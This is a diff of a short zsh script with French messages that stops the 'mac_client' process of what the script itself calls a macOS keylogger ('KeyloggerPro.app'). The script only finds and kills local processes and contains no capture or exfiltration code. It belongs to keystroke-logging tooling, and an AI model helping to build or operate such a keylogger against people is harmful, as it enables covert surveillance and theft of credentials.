@@ -1,21 +1,16 @@
-#!/bin/bash
+#!/bin/zsh
+cd "$(dirname "$0")"
 
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-PID_FILE="$SCRIPT_DIR/.mac_client.pid"
+echo "Arrêt du keylogger macOS..."
 
-if [ ! -f "$PID_FILE" ]; then
+pids=$(ps aux | grep "KeyloggerPro.app/Contents/MacOS/mac_client" | grep -v grep | awk '{print $2}')
+
+if [ -z "$pids" ]; then
   echo "[!] Aucun PID trouvé."
-  exit 0
-fi
-
-PID=$(cat "$PID_FILE")
-if ps -p "$PID" >/dev/null 2>&1; then
-  kill "$PID" >/dev/null 2>&1 || true
-  echo "[✓] Processus mac_client (PID $PID) arrêté."
 else
-  echo "[!] Aucun processus mac_client actif pour PID $PID."
+  for pid in $pids; do
+    echo "[✓] Processus mac_client (PID $pid) arrêté."
+    kill "$pid" 2>/dev/null || true
+  done
 fi
-
-rm -f "$PID_FILE"
-exit 0
 
